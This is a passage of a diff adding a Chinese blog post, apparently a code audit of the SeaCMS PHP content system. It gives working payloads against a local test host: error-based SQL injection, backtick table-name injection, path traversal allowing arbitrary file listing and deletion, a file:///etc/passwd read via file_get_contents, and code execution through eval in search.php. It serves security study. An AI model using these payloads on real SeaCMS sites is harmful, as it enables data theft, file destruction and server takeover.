DESC&quot;</span>;<br>    <span class="hljs-variable">$dsql</span>-&gt;setQuery(<span class="hljs-variable">$sql</span>);<br>  	……<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>现在我们就需要构造一个poc，上面我们知道，需要的条件有：1、**$page&gt;=2** ；2、**$gid&gt;0<strong>；3、</strong>$rlist** 为数组</p>
+<p>最终构造的POC：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://seacms.test:8888/comment/api/index.php?gid=1&amp;page=2&amp;rlist</span>[<span class="hljs-string"></span>]=extractvalue(1,concat_ws(0x7e,user(),database()))<br></code></pre></td></tr></table></figure>
+
+<p>注意绕过SeaCMS内置的waf</p>
+<img src="img/seacms/image-20210810185247600.png" srcset="/img/loading.gif" lazyload alt="image-20210810185247600" style="zoom:50%;" />
+
+<p>像这种漏洞通过黑盒测试是很难测出来的，如果通过代码审计找到这个漏洞就会比较有成就感</p>
+<h3 id="后台反引号sql注入"><a href="#后台反引号sql注入" class="headerlink" title="后台反引号sql注入"></a>后台反引号sql注入</h3><blockquote>
+<p>admin/admin_database.php</p>
+</blockquote>
+<p>这是一个很典型的sql注入漏洞，使用 addslashes() 只能过滤掉单引号的注入，使用反引号包裹变量可以绕过，反引号一般用于包裹表名，可以利用下面的正则全局搜索一下</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">`<span class="hljs-selector-attr">[$]</span><span class="hljs-selector-attr">[A-Za-z0-9_]</span>*`<br></code></pre></td></tr></table></figure>
+
+<p>便可以找到 admin_database.php 存在这样的代码：</p>
+<ul>
+<li><p>admin_database.php 加载了 config.php，就会对GPC数据过滤并注册、验证登陆状态</p>
+</li>
+<li><p>通过控制 <code>$action==&quot;bak&quot;</code>，<code>$nowtable</code>不为空，就可以成功执行</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">From</span> `$nowtable`<br></code></pre></td></tr></table></figure>
+
+<p>而 <code>$nowtable</code> 不为空且可控，可以通过该值传入sql语句。这里就是常见的反引号包裹表名绕过单引号过滤导致的SQL注入</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(dirname(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&quot;/config.php&quot;</span>);<br>……<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&quot;bak&quot;</span>)<br>&#123;<br>  <span class="hljs-variable">$tables</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-variable">$tablearr</span>);<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$tablearr</span>))<br>	&#123;<br>		ShowMsg(<span class="hljs-string">&#x27;你没选中任何表！&#x27;</span>,<span class="hljs-string">&#x27;admin_database.php&#x27;</span>);<br>		<span class="hljs-keyword">exit</span>();<br>	&#125;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$nowtable</span>==<span class="hljs-string">&#x27;&#x27;</span>)<br>  &#123;<br>    ……<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-variable">$dsql</span>-&gt;SetQuery(<span class="hljs-string">&quot;Select * From `<span class="hljs-subst">$nowtable</span>` &quot;</span>);<br>		<span class="hljs-variable">$dsql</span>-&gt;Execute();<br>  &#125;<br>  <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row2</span> = <span class="hljs-variable">$dsql</span>-&gt;GetArray())<br>	&#123;<br>  	  <br>  &#125;<br>  <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;count(<span class="hljs-variable">$tables</span>);<span class="hljs-variable">$i</span>++)<br>		&#123;<br>			<span class="hljs-keyword">if</span>(<span class="hljs-variable">$tables</span>[<span class="hljs-variable">$i</span>]==<span class="hljs-variable">$nowtable</span>)<br>			&#123;<br>				<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$tables</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>]))<br>				&#123;<br>					<span class="hljs-variable">$nowtable</span> = <span class="hljs-variable">$tables</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>];<br>					<span class="hljs-variable">$startpos</span> = <span class="hljs-number">0</span>;<br>					<span class="hljs-keyword">break</span>;<br>				&#125;<span class="hljs-keyword">else</span><br>				&#123;<br>					PutInfo(<span class="hljs-string">&quot;完成所有数据备份！&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>					header(<span class="hljs-string">&#x27;Location:admin_database.php&#x27;</span>);<br>					<span class="hljs-keyword">exit</span>();<br>				&#125;<br>			&#125;<br>		&#125;<br>  	<span class="hljs-variable">$doneForm</span>=<span class="hljs-string">&quot;&lt;form name=&#x27;gonext&#x27; method=&#x27;post&#x27; action=&#x27;admin_database.php?action=bak&#x27;&gt;&quot;</span><br>    <span class="hljs-comment">//…… 一直跳转备份</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但我这里遇到两个小问题：</p>
+<p>1）构造sql报错语句</p>
+<p>该处为闭合表名注入sql语句，最好的方式是构造报错语句。一般遇到的sql注入都是在where处，此处sql注入位于表名，最好注入where语句，如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `sea_admin` <span class="hljs-keyword">WHERE</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,DATABASE()));<br></code></pre></td></tr></table></figure>
+
+<p>这个前提是要知道存在的表名，否则会因为表名不存在报错而没有执行我们注入的报错语句</p>
+<p>表名一般都很好猜测，其次这里既然是参数传来，我们抓包应该也能获取到</p>
+<p>2）循环备份逻辑干扰结果判断</p>
+<p>详细读了代码，发现注入sql语句会导致网站一直循环备份，影响sql注入的结果，我没有找到停止循环的方式，很烦。</p>
+<p>不过该处的循环方式采用的是自动发起一个form表单，相当于再次访问该网页。于是我便用burp来发包，确保只看第一个数据包</p>
+<img src="img/seacms/image-20210709161343367.png" srcset="/img/loading.gif" lazyload alt="image-20210709161343367" style="zoom:50%;" />
+
+<h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><p>这一个就比较有意思了，在Seay扫描结果中发现一个可能任意文件删除</p>
+<img src="img/seacms/image-20210709172002654.png" srcset="/img/loading.gif" lazyload alt="image-20210709172002654" style="zoom:50%;" />
+
+<p>现在浏览器中打开该网页，有种目录遍历的感觉呀</p>
+<img src="img/seacms/image-20210709172057928.png" srcset="/img/loading.gif" lazyload alt="image-20210709172057928" style="zoom:50%;" />
+
+<p>查看代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(dirname(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">&quot;/config.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$action</span>))<br>&#123;<br>	<span class="hljs-variable">$action</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$dirTemplate</span>=<span class="hljs-string">&quot;../templets&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;edit&#x27;</span>)&#123;&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;del&#x27;</span>)&#123;&#125;<br><span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$action</span>==<span class="hljs-string">&#x27;add&#x27;</span>)&#123;&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$path</span>)) <span class="hljs-variable">$path</span>=<span class="hljs-variable">$dirTemplate</span>; <span class="hljs-keyword">else</span> <span class="hljs-variable">$path</span>=strtolower(<span class="hljs-variable">$path</span>);<br>	<span class="hljs-keyword">if</span>(substr(<span class="hljs-variable">$path</span>,<span class="hljs-number">0</span>,<span class="hljs-number">11</span>)!=<span class="hljs-variable">$dirTemplate</span>)&#123;<br>		ShowMsg(<span class="hljs-string">&quot;只允许编辑templets目录！&quot;</span>,<span class="hljs-string">&quot;admin_template.php&quot;</span>);<br>		<span class="hljs-keyword">exit</span>;<br>	&#125;<br>	<span class="hljs-variable">$flist</span>=getFolderList(<span class="hljs-variable">$path</span>);<br>	<span class="hljs-keyword">include</span>(sea_ADMIN.<span class="hljs-string">&#x27;/templets/admin_template.htm&#x27;</span>);<br>	<span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>截取 <code>$path</code> 前11位字符，如果不等于 <code>../templets</code> 则直接退出</p>
+<p>前11位字符控制了，但我们还可以控制后面的字符：<code>../templets/../../</code></p>
+<img src="img/seacms/image-20210709173837198.png" srcset="/img/loading.gif" lazyload alt="image-20210709173837198" style="zoom:50%;" />
+
+<p>到这，我们有了整个操作系统文件的基础控制权，包括浏览，删除等操作</p>
+<p>具体看了seacms提供的功能，对应每个文件都会有删除功能，而且同样只限制了前11位字符，可以绕过实现任意文件删除，而且此处因为可以浏览操作系统中存在哪些文件，于是删除哪些文件都能知道路径，做到「真任意文件删除」</p>
+<p>另外本处只能通过<strong>编辑</strong>功能查看部分后缀文件，虽然有限，但同样能看到操作系统中的所有符合要求的文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$filetype</span>!=<span class="hljs-string">&quot;html&quot;</span> &amp;&amp; <span class="hljs-variable">$filetype</span>!=<span class="hljs-string">&quot;htm&quot;</span> &amp;&amp; <span class="hljs-variable">$filetype</span>!=<span class="hljs-string">&quot;js&quot;</span> &amp;&amp; <span class="hljs-variable">$filetype</span>!=<span class="hljs-string">&quot;css&quot;</span> &amp;&amp; <span class="hljs-variable">$filetype</span>!=<span class="hljs-string">&quot;txt&quot;</span>)<br>	&#123;<br>		ShowMsg(<span class="hljs-string">&quot;操作被禁止！&quot;</span>,<span class="hljs-string">&quot;admin_template.php&quot;</span>);<br>		<span class="hljs-keyword">exit</span>;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><blockquote>
+<p>admin/templets/admin_collect_ruleadd2.htm</p>
+</blockquote>
+<p>这个htm文件通过 <code>file_get_contents()</code> 读取 <code>$siteurl</code> 的内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//96-101</span><br><span class="hljs-meta">&lt;?php</span> <br>		<span class="hljs-variable">$content</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$showcode</span>)?@file_get_contents(<span class="hljs-variable">$siteurl</span>):<span class="hljs-string">&#x27;&#x27;</span>;<br>		<span class="hljs-variable">$content</span> = <span class="hljs-variable">$coding</span>==<span class="hljs-string">&#x27;gb2312&#x27;</span>?gbutf8(<span class="hljs-variable">$content</span>):<span class="hljs-variable">$content</span>;<br>		<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$content</span>) <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;读取URL出错&quot;</span>;<br>		<span class="hljs-keyword">echo</span> htmlspecialchars(<span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure>
+
+<p>全局搜索包含<code>admin_collect_ruleadd2.htm</code>的文件，发现admin/admin_collect.php和admin/admin_collect_news.php两个文件均有包含，大致看了内容差不多，按照里面的逻辑构造，利用变量覆盖，最终构造payload如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">POST:http:<span class="hljs-comment">//seacms.test:8888/admin/admin_collect_news.php</span><br>action=addrule&amp;step=<span class="hljs-number">2</span>&amp;itemname=<span class="hljs-number">1</span>&amp;siteurl=file:<span class="hljs-comment">///etc/passwd&amp;showcode=111</span><br></code></pre></td></tr></table></figure>
+
+<p>效果：</p>
+<img src="img/seacms/image-20210712182104431.png" srcset="/img/loading.gif" lazyload alt="image-20210712182104431" style="zoom:50%;" />
+
+<p>在php中file_get_contents()也可以造成SSRF漏洞</p>
+<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><blockquote>
+<p>include/main.class.php</p>
+</blockquote>
+<p>该文件有5个差不多的<code>eval</code>语句，具体逻辑有点复杂，我们先直接查看关键语句，可能会被<code>eval</code>执行的<code>$strIf</code>基本来自<code>$content</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseIf</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>)</span>&#123;<br>  <span class="hljs-variable">$labelRule</span> = buildregx(<span class="hljs-string">&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;</span>,<span class="hljs-string">&quot;is&quot;</span>);<br>  preg_match_all(<span class="hljs-variable">$labelRule</span>,<span class="hljs-variable">$content</span>,<span class="hljs-variable">$iar</span>);<br>  <span class="hljs-variable">$strIf</span>=<span class="hljs-variable">$iar</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$m</span>];<br>  ……<br>		@<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;if(&quot;</span>.<span class="hljs-variable">$strIf</span>.<span class="hljs-string">&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;</span>);<br>  ……<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后追踪一下<code>parseIf()</code>函数</p>
+<hr>
+<blockquote>
+<p>search.php</p>
+</blockquote>
+<p>其中 <code>$content</code> 来自一个缓存文件，为搜索结果展示给用户的 HTML 页面</p>
+<p>在 <code>echoSearchPage()</code> 中，将会对 <code>$content</code> 部分内容做定制替换</p>
+<p>最后 <code>$content</code> 将被 <code>patseIf()</code> 执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;include/common.php&quot;</span>);<br><span class="hljs-keyword">require_once</span>(sea_INC.<span class="hljs-string">&quot;/main.class.php&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>)<br>&#123;<br>	<span class="hljs-variable">$$k</span>=_RunMagicQuotes(gbutf8(RemoveXSS(<span class="hljs-variable">$v</span>)));<br>	<span class="hljs-variable">$schwhere</span>.= <span class="hljs-string">&quot;&amp;<span class="hljs-subst">$k</span>=&quot;</span>.urlencode(<span class="hljs-variable">$$k</span>);<br>&#125;<br><span class="hljs-variable">$page</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) &amp;&amp; is_numeric(<span class="hljs-variable">$page</span>)) ? <span class="hljs-variable">$page</span> : <span class="hljs-number">1</span>;<br>echoSearchPage();<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">echoSearchPage</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>  	<span class="hljs-keyword">if</span>(intval(<span class="hljs-variable">$searchtype</span>)==<span class="hljs-number">5</span>)<br>		&#123;<br>			<span class="hljs-variable">$searchTemplatePath</span> = <span class="hljs-string">&quot;/templets/&quot;</span>.<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;cfg_df_style&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;cfg_df_html&#x27;</span>].<span class="hljs-string">&quot;/cascade.html&quot;</span>;<br>      ……<br>    &#125;<br>  	……<br>    <span class="hljs-variable">$content</span> = str_replace(<span class="hljs-string">&quot;&#123;searchpage:page&#125;&quot;</span>,<span class="hljs-variable">$page</span>,<span class="hljs-variable">$content</span>);<br>		<span class="hljs-variable">$content</span> = str_replace(<span class="hljs-string">&quot;&#123;seacms:searchword&#125;&quot;</span>,<span class="hljs-variable">$searchword</span>,<span class="hljs-variable">$content</span>);<br>		<span class="hljs-variable">$content</span> = str_replace(<span class="hljs-string">&quot;&#123;seacms:searchnum&#125;&quot;</span>,<span class="hljs-variable">$TotalResult</span>,<span class="hljs-variable">$content</span>);<br>		<span class="hljs-variable">$content</span> = str_replace(<span class="hljs-string">&quot;&#123;searchpage:ordername&#125;&quot;</span>,<span class="hljs-variable">$order</span>,<span class="hljs-variable">$content</span>);<br>  	……<br>		<span class="hljs-variable">$content</span>=<span class="hljs-variable">$mainClassObj</span>-&gt;parseIf(<span class="hljs-variable">$content</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>通过 <code>search.php</code> 的代码可以知道的是该文件具有单独执行能力且位于前台，该文件单独对GPC数据做了全局过滤，同样使用了<code>$$</code>的方式赋值GPC数据，可能造成变量覆盖的问题，从而导致在<code>$content</code>替换的内容上我们可控，最终控制<code>parseIf</code>  中 <code>eval()</code>参数，从造成任意代码执行的漏洞。</p>
+<p>以上粗略估计可能存在任意代码执行的漏洞，但程序中变量传递十分复杂，变量能否按我们的需求传递到eval()中执行还不知道，追踪一个参数看看具体过程是否可以实现</p>
+<h3 id="正向利用"><a href="#正向利用" class="headerlink" title="正向利用"></a>正向利用</h3><p>我们可以通过<code>$page</code>、<code>$searchword</code>、<code>$TotalResult</code>、<code>$order</code>等参数控制<code>$content</code>的部分内容，其中只有<code>$order</code>是完全可控的。<code>$order</code>替换的内容是<code>&#123;searchpage:ordername&#125;</code>，在全局搜索中只有<code>cascade.html</code>文件具有这些信息</p>
+<p>当<code>$searchtype==5</code>时，<code>$content</code>文件的内容来自于<code>cascade.html</code>，这个文件内容具有以下关键信息：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&#123;searchpage:order-time-link&#125;&quot;</span> &#123;<span class="hljs-attr">if:</span>&quot;&#123;<span class="hljs-attr">searchpage:ordername</span>&#125;&quot;==<span class="hljs-string">&quot;time&quot;</span>&#125; <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-success&quot;</span> &#123;<span class="hljs-attr">else</span>&#125; <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> &#123;<span class="hljs-attr">end</span> <span class="hljs-attr">if</span>&#125; <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;orderhits&quot;</span>&gt;</span>最新上映<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&#123;searchpage:order-hit-link&#125;&quot;</span> &#123;<span class="hljs-attr">if:</span>&quot;&#123;<span class="hljs-attr">searchpage:ordername</span>&#125;&quot;==<span class="hljs-string">&quot;hit&quot;</span>&#125; <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-success&quot;</span> &#123;<span class="hljs-attr">else</span>&#125; <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> &#123;<span class="hljs-attr">end</span> <span class="hljs-attr">if</span>&#125; <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;orderaddtime&quot;</span>&gt;</span>最近热播<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&#123;searchpage:order-score-link&#125;&quot;</span> &#123;<span class="hljs-attr">if:</span>&quot;&#123;<span class="hljs-attr">searchpage:ordername</span>&#125;&quot;==<span class="hljs-string">&quot;score&quot;</span>&#125; <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-success&quot;</span> &#123;<span class="hljs-attr">else</span>&#125; <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> &#123;<span class="hljs-attr">end</span> <span class="hljs-attr">if</span>&#125; <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ordergold&quot;</span>&gt;</span>评分最高<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>便可以通过<code>$order</code>参数替换<code>$content</code>中的<code>&#123;searchpage:ordername&#125;</code>。</p>
+<p>至于需要构造什么样的内容，要看 <code>parseif()</code> 解析什么内容，程序代码太复杂，直接打断点看 <code>parseIf()</code> 中匹配 <code>$content</code> 使用的正则为：<code>/&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;/is</code></p>
+<img src="img/seacms/image-20210712140321014.png" srcset="/img/loading.gif" lazyload alt="image-20210712140321014" style="zoom:50%;" />
+
+<p>正则表达式 <code>/&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;/is</code> 的匹配结果将会有两个匹配子组，最终匹配结果为 <code>$iar</code> 数组，其中 <code>$iar[0]</code> 为整个匹配结果，<code>$iar[1]</code> 和 <code>$iar[2]</code> 为两个匹配子组</p>
+<img src="img/seacms/image-20210712151442878.png" srcset="/img/loading.gif" lazyload alt="image-20210712151442878" style="zoom:50%;" />
+
+<p>其中 <code>eval()</code> 要执行的 <code>$strIf</code> 来自 <code>$iar[1]</code> 即第一个匹配子组</p>
+<img src="img/seacms/image-20210712151703350.png" srcset="/img/loading.gif" lazyload alt="image-20210712151703350" style="zoom:50%;" />
+
+<p>那么我们现在要构造的结果内容就清晰了，构造逻辑大致如下：</p>
+<img src="img/seacms/image-20210712153232403.png" srcset="/img/loading.gif" lazyload alt="image-20210712153232403" style="zoom:50%;" />
+
+<p>代码执行的payload如下：</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">searchtype=5<span class="hljs-variable">&amp;searchword</span>=d<span class="hljs-variable">&amp;order</span>=&#125;&#123;<span class="hljs-meta">end</span> <span class="hljs-meta">if</span>&#125;&#123;<span class="hljs-meta">if</span>:1)phpinfo();<span class="hljs-meta">if</span>(1&#125;&#123;<span class="hljs-meta">end</span> <span class="hljs-meta">if</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>payload执行流程如下：</p>
+<img src="img/seacms/image-20210712153756773.png" srcset="/img/loading.gif" lazyload alt="image-20210712153756773" style="zoom:50%;" />
+
+
+
+<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>通过审计 SeaCMS 主要学习他的程序逻辑，而且 SeaCMS 还有几个有趣的漏洞，审计下来收获颇丰 </p>
+<p>参考：</p>
+<p>海洋cms官网：<a target="_blank" rel="noopener" href="https://www.seacms.net/">https://www.seacms.net/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SukaraLin/php_code_audit_project">https://github.com/SukaraLin/php_code_audit_project</a></p>
+<p>seacms多个版本的代码执行漏洞：<a target="_blank" rel="noopener" href="https://github.com/jiangsir404/PHP-code-audit/tree/master/seacms">https://github.com/jiangsir404/PHP-code-audit/tree/master/seacms</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">php代码审计</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/PHP/">PHP</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/09/10/thinkphp3/">
+                        <span class="hidden-mobile">总结 ThinkPHP3 代码审计方法</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"KoUUnhC8sqDPadKwA0C4f83s-gzGzoHsz","appKey":"FLKClsTKX9X9TPMSO1z9FK1T","placeholder":"说点什么","path":"window.location.pathname","avatar":"robohash","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
